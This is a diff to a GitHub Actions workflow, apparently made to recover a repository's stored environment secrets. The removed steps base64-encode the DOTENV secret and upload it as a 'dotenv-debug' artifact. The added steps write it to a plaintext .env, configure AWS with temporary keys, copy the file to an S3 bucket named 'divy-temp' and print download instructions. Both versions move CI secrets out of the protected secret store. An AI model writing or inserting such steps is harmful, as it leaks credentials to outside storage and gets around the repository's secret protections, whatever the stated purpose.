@@ -29,17 +29,22 @@ jobs:
           scope: '@d3-inc'
 
       - name: Create .env file
-        run: printf "%s" "${{ secrets.DOTENV }}" > .env
-      
-      - name: Create encoded file
         run: |
-          base64 .env > .env.b64
+          printf "%s" "${{ secrets.DOTENV }}" > .env
+          ls -la .env
 
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
         with:
-          name: dotenv-debug
-          path: .env.b64
+          aws-access-key-id: ${{ secrets.TEMP_AWS_ACCESS_KEY_ID }}
+          aws-secret-access-key: ${{ secrets.TEMP_AWS_SECRET_ACCESS_KEY }}
+          aws-region: ${{ secrets.TEMP_AWS_REGION }}
+
+      - name: Upload .env to S3
+        run: |
+          aws s3 cp .env s3://divy-temp/.env
+          echo "Done! Download with:"
+          echo "aws s3 cp s3://divy-temp/.env ./recovered.env"
         
       # - name: Install dependencies
       #   run: npm install
